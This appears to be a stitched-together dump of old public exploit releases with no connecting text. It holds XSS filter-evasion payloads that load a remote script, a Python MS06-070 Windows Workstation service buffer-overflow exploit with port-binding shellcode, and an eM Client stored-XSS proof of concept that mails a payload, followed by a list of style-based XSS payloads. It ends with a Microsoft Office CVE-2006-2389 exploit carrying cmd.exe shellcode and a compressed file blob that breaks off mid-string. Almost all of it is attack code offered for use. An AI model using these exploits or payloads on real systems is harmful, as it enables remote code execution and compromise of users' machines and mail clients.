Paylaod-: <SCRIPT a="blah" '' SRC="http://server/xss.js"></SCRIPT>

Paylaod-: <SCRIPT "a='>'" SRC="http://server/xss.js"></SCRIPT>

Paylaod-: <SCRIPT a=`>` SRC="http://server/xss.js"></SCRIPT>

Paylaod-: <SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://server/xss.js"></SCRIPT>

Paylaod-: <SCRIPT a=">'>" SRC="http://server/xss.js"></SCRIPT>

'''













#!/usr/bin/python
# MS06-070 Windows WorkStation NetpManageIPCConnect Vulnerability Exploit
# Tested on windows 2000 server SP4
#
# Usage: python NetAPI-NetrJoinDomain2.py <target ip> <domainname>
# Requires a domain controller on the network (configure samba as DC)
# Requires python and impacket
#
# Winny M Thomas ;-)


from impacket.dcerpc import transport
from impacket import uuid
import sys
import socket
import struct

def DCEconnectAndExploit(target, domain):
       baselen = 3708

       stringbinding = "ncacn_np:%(host)s[\\pipe\\%(pipe)s]"
       stringbinding %= {'host': target,'pipe': 'wkssvc','port': 445,}

       print 'Connecting to named pipe (wkssvc)'
       trans = transport.DCERPCTransportFactory(stringbinding)
       trans.connect()
       print 'Setting up DCE transport'
       dce = trans.DCERPC_class(trans)
       dce.bind(uuid.uuidtup_to_bin(('6bffd098-a112-3610-9833-46c3f87e345a','1.0')))

       print 'Sending attack payload to target'
       #NetrJoinDomain2 data: Hostname
       query1 =  "\xaa\xbb\xcc\xdd"
       query1 += "\x07\x00\x00\x00"
       query1 += "\x00\x00\x00\x00"
       query1 += "\x07\x00\x00\x00"
       query1 += "\x5C\x00\x5C\x00"
       query1 += "\x41\x00\x55\x00"
       query1 += "\x58\x00\x37\x00"
       query1 += "\x00\x00\x00\x00"

       #NetrJoinDomain2 data: Domain/Hostname

       targetd = '\x00'.join(list(domain)) + '\x00'
       Len = baselen + len(domain)
       query2 =  struct.pack('L', Len)
       query2 += struct.pack('L', 0)
       query2 += struct.pack('L', Len)
       query2 += targetd

       query3 = "\x5C\x00\x5C\x00\x76\x00\x90\x90"
       query3 += "\x90\x90" * 1058
       query3 += "\xEB\x06" #6 byte jump from current pointer in ebx
       query3 += "\x27\x16\xE1\x77" #Address from user32.dll (0x77E11627)
       #350 byte port binding shellcode
       query3 += "\x90\x90\x90\x90\x90\x90"
       query3 += "\x33\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73"
       query3 += "\x13\xe9\x59\x23\xce\x83\xeb\xfc\xe2\xf4\x15\x33\xc8\x83"
       query3 += "\x01\xa0\xdc\x31\x16\x39\xa8\xa2\xcd\x7d\xa8\x8b\xd5\xd2"
       query3 += "\x5f\xcb\x91\x58\xcc\x45\xa6\x41\xa8\x91\xc9\x58\xc8\x87"
       query3 += "\x62\x6d\xa8\xcf\x07\x68\xe3\x57\x45\xdd\xe3\xba\xee\x98"
       query3 += "\xe9\xc3\xe8\x9b\xc8\x3a\xd2\x0d\x07\xe6\x9c\xbc\xa8\x91"
       query3 += "\xcd\x58\xc8\xa8\x62\x55\x68\x45\xb6\x45\x22\x25\xea\x75"
       query3 += "\xa8\x47\x85\x7d\x3f\xaf\x2a\x68\xf8\xaa\x62\x1a\x13\x45"
       query3 += "\xa9\x55\xa8\xbe\xf5\xf4\xa8\x8e\xe1\x07\x4b\x40\xa7\x57"
       query3 += "\xcf\x9e\x16\x8f\x45\x9d\x8f\x31\x10\xfc\x81\x2e\x50\xfc"
       query3 += "\xb6\x0d\xdc\x1e\x81\x92\xce\x32\xd2\x09\xdc\x18\xb6\xd0"
       query3 += "\xc6\xa8\x68\xb4\x2b\xcc\xbc\x33\x21\x31\x39\x31\xfa\xc7"
       query3 += "\x1c\xf4\x74\x31\x3f\x0a\x70\x9d\xba\x0a\x60\x9d\xaa\x0a"
       query3 += "\xdc\x1e\x8f\x31\x32\x95\x8f\x0a\xaa\x2f\x7c\x31\x87\xd4"
       query3 += "\x99\x9e\x74\x31\x3f\x33\x33\x9f\xbc\xa6\xf3\xa6\x4d\xf4"
       query3 += "\x0d\x27\xbe\xa6\xf5\x9d\xbc\xa6\xf3\xa6\x0c\x10\xa5\x87"
       query3 += "\xbe\xa6\xf5\x9e\xbd\x0d\x76\x31\x39\xca\x4b\x29\x90\x9f"
       query3 += "\x5a\x99\x16\x8f\x76\x31\x39\x3f\x49\xaa\x8f\x31\x40\xa3"
       query3 += "\x60\xbc\x49\x9e\xb0\x70\xef\x47\x0e\x33\x67\x47\x0b\x68"
       query3 += "\xe3\x3d\x43\xa7\x61\xe3\x17\x1b\x0f\x5d\x64\x23\x1b\x65"
       query3 += "\x42\xf2\x4b\xbc\x17\xea\x35\x31\x9c\x1d\xdc\x18\xb2\x0e"
       query3 += "\x71\x9f\xb8\x08\x49\xcf\xb8\x08\x76\x9f\x16\x89\x4b\x63"
       query3 += "\x30\x5c\xed\x9d\x16\x8f\x49\x31\x16\x6e\xdc\x1e\x62\x0e"
       query3 += "\xdf\x4d\x2d\x3d\xdc\x18\xbb\xa6\xf3\xa6\x19\xd3\x27\x91"
       query3 += "\xba\xa6\xf5\x31\x39\x59\x23\xce";
       query3 += "\x90\x90" * 2467
       query3 += "\x00\x00"

       query3 += "\x00\x00\x00\x00"
       query3 += "\x00\x00\x00\x00"
       query3 += "\x00\x00\x00\x00"
       query3 += "\x00\x00"
       query3 += "\x01\x00\x00\x00"

       query = query1 + query2 + query3
       dce.call(0x16, query)

if __name__ == '__main__':
       try:
               target = sys.argv[1]
               domain = sys.argv[2]
       except IndexError:
               print 'Usage: %s <target ip> <domain>' % sys.argv[0]
               sys.exit(-1)

       DCEconnectAndExploit(target, domain)

# milw0rm.com [2006-11-18]
#!/usr/bin/python
'''

Author: loneferret of Offensive Security
Date: 22-08-2013
Product: eM Client for Windows
Version: 5.0.18025.0 (previous versions and other platforms may be vulnerable)
Vendor Site: http://www.emclient.com/
Software Download: http://www.emclient.com/download

Tested on: Windows XP Pro SP3 Eng.
Tested on: Windows 7 Pro SP1 Eng.
eM Client: Using default settings


E-mail client is vulnerable to stored XSS. Either opening or viewing the e-mail and you 
get an annoying alert box etc etc etc.
Injection Point:  Body
 
Gave vendor 7 days to reply in order to co-ordinate a release date. 
Timeline:
23 Aug 2013: Tentative release date 30 Aug 2013
23 Aug 2013: Vulnerability reported to vendor. Provided a list of payloads
26 Aug 2013: No response from vendor, sent a reminder email
27 Aug 2013: Vendor responded, will issue update to fix within 14 days
27 Aug 2013: Tentative release date pushed to September 10th 2013
27 Aug 2013: Replied to vendor with new date
09 Sep 2013: Contacted vendor with remainder of release date
09 Sep 2013: Vendor responded with go ahead with release
10 Sep 2013: Public release

Solution: Upgrade/update to latest version (haven't tested yet)

'''

import smtplib, urllib2

payload = '''<DIV STYLE="background-image: url(javascript:alert('XSS'))">'''

def sendMail(dstemail, frmemail, smtpsrv, username, password):
        msg  = "From: hacker@offsec.local\n"
        msg += "To: victim@offsec.local\n"
        msg += 'Date: Today\r\n'
        msg += "Subject: XSS payload\n"
        msg += "Content-type: text/html\n\n"
        msg += payload + "\r\n\r\n"
        server = smtplib.SMTP(smtpsrv)
        server.login(username,password)
        try:
                server.sendmail(frmemail, dstemail, msg)
        except Exception, e:
                print "[-] Failed to send email:"
                print "[*] " + str(e)
        server.quit()

username = "test@test.com"
password = "123456"
dstemail = "test@test.com"
frmemail = "hacker@offsec.local"
smtpsrv  = "172.16.61.165"

print "[*] Sending Email"
sendMail(dstemail, frmemail, smtpsrv, username, password)

'''
# Payloads
[+] Payload 1 : DIV background-image 1
[+] Code for 1 : <DIV STYLE="background-image: url(javascript:alert('XSS'))">
------------
[+] Payload 2 : DIV background-image 2
[+] Code for 2 : <DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
------------
[+] Payload 3 : DIV expression
[+] Code for 3 : <DIV STYLE="width: expression(alert('XSS'));">
------------
[+] Payload 4 : IMG STYLE w/expression
[+] Code for 4 : exp/*<XSS STYLE='no\xss:noxss("*//*");
xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
------------
[+] Payload 5 : List-style-image
[+] Code for 5 : <STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
------------
[+] Payload 6 : STYLE w/Comment
[+] Code for 6 : <IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
------------
[+] Payload 7 : STYLE w/Anonymous HTML
[+] Code for 7 : <XSS STYLE="xss:expression(alert('XSS'))">
------------
[+] Payload 8 : STYLE w/background-image
[+] Code for 8 : <STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
------------
[+] Payload 9 : TABLE
[+] Code for 9 : <TABLE BACKGROUND="javascript:alert('XSS')"></TABLE>
------------
[+] Payload 10 : TD
[+] Code for 11 : <TABLE><TD BACKGROUND="javascript:alert('XSS')"></TD></TABLE>
------------
[+] Payload 12 : Commented-out Block
[+] Code for 12 : <!--[if gte IE 4]>
<SCRIPT>alert('XSS');</SCRIPT>
<![endif]-->
----
'''
source: http://www.securityfocus.com/bid/18911/info

Microsoft Office is prone to a code-execution vulnerability. This is due to a failure to handle exceptional conditions.

Successfully exploiting this issue allows attackers to corrupt process memory and to execute arbitrary code in the context of targeted users.

#Microsoft Office Property Code Execution exploit (CVE-2006-2389)
#Author Abhishek Lyall - abhilyall[at]gmail[dot]com, info[at]aslitsecurity[dot]com
#Web - http://www.aslitsecurity.com/
#Blog - http://www.aslitsecurity.blogspot.com/
#Vulnerble application MS office 2003
#Tested on XP SP2 - MS Ofice 2003 
#Greets Mila http://contagiodump.blogspot.com, Villy and ASL IT SECURITY TEAM
#!/usr/bin/python




import sys
import zlib

#Allwin WinExec cmd.exe + ExitProcess Shellcode - 195 bytes by RubberDuck =)
shellcode = (
b"\xFC\x33\xD2\xB2\x30\x64\xFF\x32\x5A\x8B"
b"\x52\x0C\x8B\x52\x14\x8B\x72\x28\x33\xC9"
b"\xB1\x18\x33\xFF\x33\xC0\xAC\x3C\x61\x7C"
b"\x02\x2C\x20\xC1\xCF\x0D\x03\xF8\xE2\xF0"
b"\x81\xFF\x5B\xBC\x4A\x6A\x8B\x5A\x10\x8B"
b"\x12\x75\xDA\x8B\x53\x3C\x03\xD3\xFF\x72"
b"\x34\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03"
b"\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47"
b"\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F"
b"\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72"
b"\x65\x75\xE2\x49\x8B\x72\x24\x03\xF3\x66"
b"\x8B\x0C\x4E\x8B\x72\x1C\x03\xF3\x8B\x14"
b"\x8E\x03\xD3\x52\x68\x78\x65\x63\x01\xFE"
b"\x4C\x24\x03\x68\x57\x69\x6E\x45\x54\x53"
b"\xFF\xD2\x68\x63\x6D\x64\x01\xFE\x4C\x24"
b"\x03\x6A\x05\x33\xC9\x8D\x4C\x24\x04\x51"
b"\xFF\xD0\x68\x65\x73\x73\x01\x8B\xDF\xFE"
b"\x4C\x24\x03\x68\x50\x72\x6F\x63\x68\x45"
b"\x78\x69\x74\x54\xFF\x74\x24\x20\xFF\x54"
b"\x24\x20\x57\xFF\xD0"
)

compressedfile = (
b"\x78\x9C\xED\xDD\x0D\x9C\x4D\x75\xFE\xC0\xF1\xEF\xBD\x73\x67\xCC\x93\x31\x9E\xC7\x78\x1A\x9A\xC4\x98\x34\x31\x84"
b"\x18\x8F\xA1\xC9\x53\x9E\x09\x0D\xA1\x31\x86\x11\xE3\x61\x65\x6B\x48\x56\xA5\x56\x25\x49\xA2\x07\x49\xDA\x24\x49"
b"\x25\x49\xD6\x5A\x21\xC9\x4A\x65\x7B\x60\x64\xEB\x2F\xB5\x93\x55\x28\xB9\xFF\xCF\xEF\x9C\x73\x67\xEE\xBD\x73\x0F"
b"\x77\x34\x2D\xAD\xDF\xEF\xFB\x7A\xCF\xB9\xBF\x73\xEE\x3D\x4F\xBF\x73\x7E\xE7\xE1\xFE\xEE\x99\xDD\xEF\x97\x3F\xF0"
b"\xD4\xCB\xF1\x07\xC5\x2F\xA5\x49\x88\x9C\x71\x47\x48\x98\x57\x3F\x27\x36\x78\x32\xB1\x22\x1B\xE9\x38\x70\xC6\xED"
b"\x76\xAB\x5E\xEB\xF1\x26\xDC\x3A\xFD\x6E\xD2\xD1\x67\xDF\x91\x6E\x09\xD5\x5C\x22\x05\x15\xDE\x2E\x2C\x59\x12\x7D"
b"\xF6\xEE\x12\x89\x91\xE1\x59\xC3\xB3\xF2\x5B\xE7\xB7\xF6\xDF\x42\x44\xAA\xB9\xAA\x48\xAD\x18\x87\xE4\xF5\x17\x43"
b"\xD6\xC8\xE2\xEF\xF1\x4E\x6E\x77\xB9\x73\xBE\xF6\xA4\x6C\xE3\xEF\x32\x87\x14\x76\xBD\x5F\xDB\x75\x2B\x79\x8D\x61"
b"\xAF\xD3\xEC\x26\xD4\xB5\xEF\x26\xD2\xED\x48\x77\xAF\xD7\xFB\x0F\xB7\x11\x69\xCF\xB8\x12\x2F\x33\xF3\xE7\xEA\xDE"
b"\x97\x18\xB8\xEB\x6A\x63\xEE\x31\x61\x6D\xCC\x7C\x30\x5D\xF5\xD1\x2B\xDA\x31\x6F\x7C\xB0\x73\x07\x91\x99\xE4\x93"
b"\xE8\x3F\xA9\xD8\xFA\x29\x5A\x6E\xCF\xF4\xFC\xD3\x68\xFA\xD7\x3D\xCB\xFC\x25\x59\xD3\x7D\x30\xC5\x77\x7C\x9E\xAE"
b"\x67\xF9\x3C\x49\xE5\xAF\x63\xD8\x52\x3E\x57\xC5\xEB\x73\xFE\x5D\x35\xFE\xCD\x51\xC5\xC7\xE3\x9F\x77\xB5\xF1\x1D"
b"\xBF\xE7\xF3\x25\x4D\xDE\xEB\xDB\x33\x9E\xAF\x9D\x45\xE3\xFB\x43\x13\xE6\x97\xFC\x9C\x96\x6C\xA5\x01\xB6\xA3\xF3"
b"\x4D\x19\xAD\xCC\xAE\x67\x79\xE2\xE8\x46\x1B\xAF\xDE\xE8\xF1\xC2\xAC\x77\x1C\x6A\x7B\xEA\x5A\xBB\x68\x7B\xEB\x96"
b"\x62\x96\x47\x38\x9F\x4B\xF6\x1B\xCF\x32\xDE\xFB\x2A\xF3\xAF\x66\xF9\xB0\xB5\x1C\xA9\xD6\xFB\xDE\xED\x60\xE6\x73"
b"\xAC\xCF\x7B\xF2\x9E\xE9\x7B\x96\xF3\x75\x87\xB9\xBD\xB4\x64\x5C\x8B\xC4\x7B\x39\x57\xAE\x94\x00\x79\xA7\x7C\xC2"
b"\xDF\x84\x73\x46\x59\x22\xDC\xF8\xAB\x72\x3A\xE9\xA4\x93\x4E\x17\x6B\x3A\x77\x7D\xA6\x43\x87\x0E\x1D\x3A\x74\xE8"
b"\xD0\xA1\x43\x87\x0E\x1D\x3A\x74\xE8\xD0\xA1\x43\x87\x0E\x1D\x3A\x74\xE8\xD0\xA1\x43\x87\x0E\x1D\x3A\x74\xE8\xD0"
b"\xA1\x43\x87\x0E\x1D\x3A\x74\xE8\xD0\xA1\x43\x87\x0E\x1D\x3A\x74\xE8\xD0\xA1\x43\x87\x0E\x1D\x3A\x74\xE8\xD0\xA1"
b"\x43\x87\x0E\x1D\x3A\x74\xE8\xD0\xA1\x43\x87\x0E\x1D\x3A\x74\xE8\xD0\xA1\x43\x87\x0E\x1D\x3A\x74\xE8\xD0\xA1\x43"
b"\x87\x0E\x1D\x3A\x74\xE8\xD0\xA1\x43\x87\x8E\x8B\x21\x16\x6F\xBA\xD0\x73\xA0\x43\x87\x0E\x1D\x3A\x74\xE8\xD0\xA1"
b"\x43\x87\x0E\x1D\x3A\x74\xE8\xD0\xA1\x43\x87\x0E\x1D\x3A\x74\xE8\xD0\xA1\x43\x87\x0E\x1D\x3A\x74\xE8\xD0\xA1\x43"
b"\x87\x0E\x1D\x3A\x74\xE8\xD0\xA1\x43\x87\x0E\x1D\x3A\x74\xE8\xD0\xA1\x43\x87\x0E\x1D\x3A\x74\xE8\xD0\xA1\x43\x87"
b"\x0E\x1D\x3A\x74\xE8\xD0\xA1\x43\x87\x0E\x1D\x3A\x74\xE8\xD0\xA1\x43\x87\x0E\x1D\x3A\x74\xE8\xD0\xA1\x43\x87\x0E"
b"\x1D\x3A\x74\xE8\xD0\xA1\x43\x87\x0E\x1D\x3A\x74\xE8\xD0\xA1\x43\x87\x0E\x1D\x3A\x74\xE8\xD0\xF1\xDB\x84\x4E\x25"
b"\x48\x2E\x91\x7A\xA8\x8F\x87\x30\x33\x54\x64\x15\x56\xA3\x6D\x98\xC8\xA7\x65\x44\x0E\x60\x42\xB8\xC8\x64\x54\x88"
b"\x12\x99\x8E\x3C\x54\x88\x16\xA9\x82\xB8\x18\x91\x5A\x38\x5E\x5E\xE4\x47\xF4\xAB\x20\x32\x0D\x6B\xB1\x1D\x3B\x71"
b"\x00\xF1\x15\x45\x9A\xA1\x39\x3A\x62\x68\x15\x91\x0C\x6C\xC1\x56\x48\x55\xC6\x87\x38\x24\x60\x31\x96\xC0\x19\xC7"
b"\x6C\x22\x0D\x7D\xD0\x0F\x43\xB1\x10\x7F\xC1\x11\x48\x35\xDE\x87\x2A\xE8\x89\xE9\x58\x8C\x25\xD8\x87\x8F\xF1\x13"
b"\xCE\x20\xBE\x3A\xCB\x86\x0C\x0C\xC7\x54\x2C\xC7\xE7\x88\xAC\x21\x92\x84\x64\x6C\xAD\x2D\xB2\x0D\xC9\x09\x22\x8D"
b"\xD0\x0B\xB9\x78\x00\xF3\xB0\x16\xEB\x10\x5D\x47\x24\x06\x27\xBE\x3E\x24\x87\xF6\x1F\x92\x0F\x09\xBA\x2A\xDE\xB7"
b"\xBA\xE6\xEB\xF7\x7D\xBA\xDE\x43\xF6\x17\x7B\x9F\x21\xAA\x4B\x92\xA3\x47\x7A\x88\xDC\x88\xF0\xB1\x5D\x22\x5C\x13"
b"\x21\xB1\x9E\x5E\x85\x7D\xC2\x3D\x7D\xA4\x46\x48\x96\x2A\x55\x4F\xBE\x6F\xB8\x63\x6C\x17\x71\x8D\xC3\xA4\x70\x87"
b"\x94\x6B\x1A\x3E\xA3\x43\x7A\xA5\xC2\xC1\xD2\x4B\x95\x7F\xA2\xB5\x0D\x24\x21\x19\xA3\x30\xCF\x6B\x7B\x98\x85\x87"
b"\xB0\x0D\xDB\x91\x16\x66\x6E\x1B\xC3\x23\x45\x46\x44\x9A\xDB\x44\x25\x54\x41\x2A\x9A\xB1\x4D\x34\x47\x3A\xBA\xAA"
b"\xD7\x65\x45\x5A\xE2\x17\xEF\xED\xCE\x27\x73\xF2\xD7\x66\x7E\x2C\xD5\xB1\xF9\x64\xBE\x0D\x2E\xF3\xA5\x6D\xA6\x74"
b"\x67\xC7\x27\xE3\x95\xD8\x37\x43\x12\x43\xCA\xCF\xDA\xED\xCC\xC0\xB0\x44\x36\x98\x58\xFF\x3E\x8E\x58\x63\x7F\x0F"
b"\x49\x74\x0C\x4B\x74\x88\xA3\x1C\xBB\x82\xCA\xEF\xDD\xE5\x57\x1C\x3A\x5D\x02\xC9\xE5\x12\x87\xC3\xA1\xF6\xCB\xEE"
b"\xE8\x89\x35\x58\x8B\xED\xC8\x47\x0A\x75\x7A\x63\x34\x43\x4B\xA4\xA1\x2D\x7E\xF2\x1E\xCD\x0F\xC1\x65\x8E\x06\x97"
b"\xC9\xAE\x71\x1E\x9F\x89\x0B\x09\xB0\x78\x77\x52\x1F\x25\x3A\xAA\x26\x3A\xAE\x1F\xE5\x20\xEB\x5C\x90\x2D\xA1\xFB"
b"\xE2\xC2\x1C\x0E\x09\x24\x7C\x5F\x27\x09\x99\xEF\x3E\xED\x9A\x5D\x39\xB6\x9E\x84\x65\x86\x16\x1B\x5F\xD8\xBD\xB1"
b"\xC1\xF4\x8B\xCC\x8D\x95\x97\xA4\xE2\xBE\x14\x63\xB8\xC3\x7A\x5F\x10\xDD\x4A\x3F\xF2\x27\x7E\x1F\xD5\xA5\xB8\x3D"
b"\xAA\xFB\x66\x6B\xF8\x66\x6B\xFA\x66\x53\xF7\x85\x89\x23\x32\x24\x5B\x86\xFD\xC8\xFA\x88\x30\x76\xF3\x2A\x9E\xC5"
b"\x57\xFB\x7B\xD1\x9E\x6F\xBC\xA2\x46\x70\x4A\xB4\x2A\xCF\x8E\xB8\x03\x1B\x11\x4D\xA5\xB0\x0A\xDB\xB1\x13\xBB\x51"
b"\x8B\xA5\x1C\x8C\x25\xB1\x7E\x15\x6D\x90\x05\xE4\x93\xF1\x19\x41\x76\xAB\x32\x36\x43\x86\x07\x97\x31\x13\x0B\x1B"
b"\x59\x4F\xA2\x3A\x39\xA5\x70\x81\x2F\xF5\xF2\x2F\x5C\x27\x8E\xA2\x75\x12\x60\x9B\x88\x52\x65\x3A\x99\x73\xB6\x78"
b"\xCE\xCF\x96\xC0\xC5\x79\x59\x26\xB2\x30\x0E\x9B\xD1\xB5\x12\x75\x44\x25\xBF\x1D\xFA\x9B\xF3\xC8\x8C\x99\x53\xBE"
b"\x28\x63\x5F\xA8\x83\x6D\x33\x45\x29\x4C\xCE\xBA\x5C\xBA\xF4\xCD\xD2\x0F\xF1\xDA\x23\x02\xED\x25\x91\xAA\x5C\x7B"
b"\xA2\x17\xFA\x60\x55\x65\xCE\xFD\xB1\x06\x6B\xB1\x0E\xAF\x63\x3D\x36\x60\x23\x36\xC1\xC5\xF9\x7A\x18\xC2\x31\x0B"
b"\x47\xD0\x91\x73\xF5\x4E\xD8\x8C\xFA\x9C\x93\xCF\xC4\x29\xEF\xD5\xF3\xBB\xC9\x14\xD8\x66\xFE\x65\x9B\xF9\xD4\x76"
b"\x6C\xF6\x9F\xD9\x23\x41\x25\x4F\xC9\x85\x05\x28\x4D\x57\x80\x7E\x21\x67\xDB\x37\xBC\xF7\x1C\xA9\xAA\xCA\x68\x2F"
b"\x5A\x5A\xD7\x4A\xA7\xAD\x6B\xA4\x69\xF1\x5C\x0F\xC5\x9B\xD7\x47\xDB\xAA\x9B\xD7\x43\xF6\xFB\xBF\xFD\x71\xFF\xB0"
b"\xED\x67\xEC\x47\xE0\x33\xE4\x9F\xE7\x5A\x39\x97\x64\xF2\x94\x74\x78\x51\x59\xFA\x94\xEB\xD9\xF6\xFF\x32\xDE\xFB"
b"\xBF\x2A\xD7\x46\x68\x8C\x8E\x35\x45\xE6\xD6\xE2\xFA\x16\x99\x5C\xF7\x66\x21\x1B\xE3\x30\x1E\x47\x71\xE7\xD1\xE8"
b"\xA2\xB9\x98\xEC\x3D\x4B\x3E\x99\xF1\xBF\x5D\x66\x94\xED\x4A\x09\xB4\xD4\xFA\x38\x71\xD6\xE3\x44\x94\x2A\x53\x75"
b"\x5F\xC3\x73\x2F\xA3\x71\x1D\x91\x85\x38\x86\x8E\x75\x45\x9E\xC6\xB2\xBA\x67\xDB\xC3\xFF\x6D\x3B\xC4\xBE\x22\xF0"
b"\xD9\xA9\x3F\xF0\xCE\xDC\x28\xC5\xD2\xA5\x5E\x46\x9E\xAD\x3A\xE2\x1C\xFB\x72\x80\xA3\xC4\xB9\xEB\x04\x75\xDF\x6A"
b"\x02\x72\xB1\x0A\xBB\x51\x60\x95\x7F\x38\xE5\x5E\x0B\x89\xA8\x87\x96\x68\x85\xF6\x75\xCD\x6D\x63\x3A\xEE\xC0\x46"
b"\x3C\x74\x99\xC8\x49\x9C\x41\xA5\x7A\x4C\x16\x93\xB1\x18\xFB\xE0\xBA\x82\xCF\x22\x13\xCB\xEA\x8B\x2C\x47\x64\x03"
b"\xAE\x37\xD0\x09\x99\x98\x9B\x44\xDD\x83\x63\x38\x8E\x46\x0D\x39\x37\xC1\x78\x4C\xC0\x1C\x2C\xC1\x32\x2C\xC7\x7A"
b"\x6C\xC0\x66\x6C\xC1\x7E\x84\x27\x73\x8D\x8A\x6C\xCC\xC5\x03\xD8\x8A\x6D\xD8\x73\x25\xC7\x3A\x34\x6F\xC4\xB2\x20"
b"\x17\x0B\xB0\x0E\xAF\x63\x17\xBE\xC4\x11\x1C\x85\x5C\xC5\xD6\x86\x70\x44\x22\x01\xDD\x31\x1B\x6B\xB0\x07\x7B\x11"
b"\xCD\x26\x12\x83\xBA\x4D\x44\xD2\xB1\x09\x5F\xA2\x4F\xAA\xC8\x00\xC4\x35\xE5\x35\x76\x61\x37\x5A\x36\x13\xF9\xF9"
b"\x87\x9F\x8F\x7A\xC5\x0F\x3F\x8B\xF1\xD7\x93\xFB\xA1\xF0\xAF\x7F\xFC\x60\xDB\xBF\xE8\x35\xB3\x5E\xFC\x1E\xA1\xCF"
b"\xBD\x44\xCF\x8B\x21\x6A\xDF\x5E\x8E\x15\xD8\xE0\x55\x96\xF3\xB1\x12\x9B\x11\x9B\x28\x52\x01\x35\xD0\x2F\xD1\xEF"
b"\xFA\x3F\xC8\x9B\x01\xFF\xB1\xFD\xCC\x91\xE0\x32\x59\xC7\xC3\x82\x79\x9B\x91\x2E\xF1\x1A\x23\xC0\x71\xAE\xF0\xCE"
b"\x9F\x71\xD5\x5F\x74\x27\x20\x5A\x95\xE7\x42\x54\xBA\x9C\x32\xC7\x02\xB4\x64\x7F\xDD\x88\x4D\xA8\xC7\xFE\x7A\xEF"
b"\x15\x41\xDF\xE6\xF1\x39\x18\x1C\xB6\xCD\x7C\x6A\x3B\x24\xC8\x33\xE2\x4B\x2B\x79\x6A\xEE\xD8\xB3\x9E\xCB\x9C\xE3"
b"\xEC\xA7\x70\x78\xA4\x77\x3F\x55\xB6\x73\xB1\x00\xDD\xA9\x93\xB7\x23\x85\xBA\xF8\x5E\x55\x1F\x63\x01\x9A\x51\x17"
b"\xAF\x41\x5C\x43\xB5\x6B\xB9\x8A\xE6\xCB\xFE\xFC\x2F\xDB\x36\xE3\x73\xA5\x7F\xE7\x16\xAF\x9D\xFA\x7C\xC6\xE6\xBB"
b"\x7E\xCA\x95\xF4\x5A\xE8\x52\xAF\x29\x24\x2A\xCE\x3A\xB6\xAA\xE3\x67\x92\x75\xBC\x3C\x8A\xEF\x70\x12\xD3\xAF\x3C"
b"\xDB\xC5\xD9\x41\xDB\x21\x1F\x79\x67\xFA\xCF\xF5\x2A\xE6\xEE\xDE\x43\x7C\x32\xFE\x49\x97\x97\xED\xB9\x60\xF9\xF3"
b"\xB8\xD6\x0B\x74\x17\x21\x5C\x95\xEF\x49\x0C\xB5\xCE\x81\xD4\x79\xCE\x78\xEB\xBC\xA6\x31\x8B\x9B\x8A\x66\x29\x67"
b"\xAB\xF2\xED\x37\x88\x1F\x6C\x87\xF8\x6E\x1D\xDE\x99\x5E\x12\x20\x15\x1D\xAF\x74\xF9\x9B\x65\x58\xE1\x3C\xCA\x3A"
b"\xE0\x76\xA2\xCA\x76\xBC\x2A\xE7\xAB\x39\xEF\x6E\xCC\x79\x37\xC2\x38\x77\x0D\x47\x17\xEB\x7C\x76\x21\xE7\xB0\x8B"
b"\xD0\x8F\x73\xD7\x01\xA8\xD5\x9C\x6B\x80\x96\x6C\x1F\xAD\xF9\x1C\xBA\x60\x31\x96\xE0\x53\x34\x4A\xF3\xFB\x3E\xD1"
b"\x7E\xE3\xF1\x79\x9B\xFD\x5D\x37\xFB\x8C\xFD\x2D\x25\xFB\xCF\xE4\x9F\x47\xE6\xB3\xE0\x46\xBD\xD7\x36\xF3\x2B\x93"
b"\xDD\xF7\x39\xC6\xF9\x5C\xF1\xEF\x7E\x8D\x61\x21\x85\xAF\xD4\xBE\x63\xBE\xC9\xD8\x02\x2A\x8A\xF1\x6D\x30\xE3\xA9"
b"\xAC\xAE\x45\x5A\xA1\x23\x3A\xA1\x0B\x86\x5E\x23\x92\x81\xAD\x94\xF3\x36\x84\xB7\x60\xCB\xC1\x3C\xCA\xFC\x21\x2C"
b"\xC2\x62\x3C\x89\xB6\xD7\xB2\x2D\xA0\x71\x2B\xB6\x0F\xE4\xB5\x15\x99\x89\x59\x78\x00\x79\xED\x78\x1F\x96\x63\x3D"
b"\xFA\xB5\x67\x1B\x42\x6E\x07\x8E\xF1\xB8\x03\x79\xD8\x8A\x6D\x90\x8E\xEC\xEE\x18\x85\x4C\x8C\xC7\x04\x1C\x40\x3E"
b"\xD6\x5D\xC7\x75\x1E\x06\x74\x12\x19\x84\xC1\x18\x81\x69\x98\x8E\x8D\xD8\x84\x84\xCE\x5C\x8F\x21\x09\xC9\x18\x8F"
b"\x09\x98\x86\x99\x58\xD1\x45\x64\x35\x16\x5D\xCF\xB2\xE0\x5F\xF8\x1A\x05\x38\x86\xF9\xE9\x9C\xFB\x60\x13\x36\x63"
b"\xCD\x0D\x22\x6B\xB1\x01\x1B\xD1\xB8\x2B\xDB\x3E\xD2\xD0\x16\x1B\xB0\x11\xB3\xBB\x71\x9D\x8A\xED\x3D\xB8\xDE\x43"
b"\x95\x9E\xEC\xFF\x90\x9B\x44\x4E\x1D\xFF\xEE\xF0\x71\x33\xBC\x5E\x7A\xF5\xF2\xE9\xFA\xF7\xB7\x7B\x8F\xA8\x90\xA0"
b"\xAF\xF8\x24\x2A\xAD\xA8\xAF\x0C\x52\xFB\x6A\x0A\x3A\x61\x28\xA6\x62\x1A\x1E\x5C\xE8\xB5\xF1\xCD\x91\x92\x67\x7E"
b"\xA7\xA9\xF8\x7E\x36\x8E\x7A\xC5\xEF\x90\x13\x92\xEA\x08\x70\xD4\xF9\xA6\x81\xE7\xA8\x93\x22\xCE\xF9\xEE\xDB\x6A"
b"\xA8\x63\xCE\x67\x35\xFC\xA7\x90\x11\xB6\x34\xE2\xEA\x7F\x8E\x7A\x33\xF9\xD6\xAB\xDF\x6D\xF7\xCE\xC1\x58\xC7\x8E"
